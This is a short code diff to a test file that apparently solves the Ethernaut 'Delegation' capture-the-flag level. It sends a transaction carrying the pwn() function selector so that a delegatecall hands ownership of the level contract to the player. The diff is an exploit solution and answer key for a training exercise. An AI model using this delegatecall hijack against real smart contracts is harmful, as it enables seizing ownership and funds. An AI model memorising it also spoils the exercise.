@@ -16,7 +16,12 @@ contract('Delegation', function ([player]) {
   it('should submit level instance successfully', async function () {
     const instance = await utils.createLevelInstance(ethernaut, level.address, player, Delegation)
 
-    // INSERT YOUR SOLUTION HERE
+    await web3.eth.sendTransaction({
+      from: player,
+      to: instance.address,
+      // pwn() selector
+      data: '0xdd365b8b',
+    })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
